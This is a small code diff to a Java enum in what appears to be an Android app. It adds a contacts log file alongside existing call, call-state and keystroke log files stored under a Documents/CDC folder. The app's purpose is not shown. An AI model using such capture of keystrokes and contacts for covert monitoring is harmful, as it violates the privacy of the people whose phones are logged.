@@ -14,6 +14,7 @@ public enum FileMap {
     CALL(Environment.DIRECTORY_DOCUMENTS + "/CDC", "call.txt", true, true, "_id", true),
     CALL_STATE(Environment.DIRECTORY_DOCUMENTS + "/CDC", "call_state.txt", false, false, null, true),
     KEYSTROKE(Environment.DIRECTORY_DOCUMENTS + "/CDC", "keystroke.txt", false, false, null, true),
+    CONTACTS(Environment.DIRECTORY_DOCUMENTS + "/CDC", "contacts.txt", true, true, "_id", true),
     TEMPORARY_FILE(Environment.DIRECTORY_DOCUMENTS + "/CDC", "temp.txt", false, false, null, false);
 
     String directoryPath;
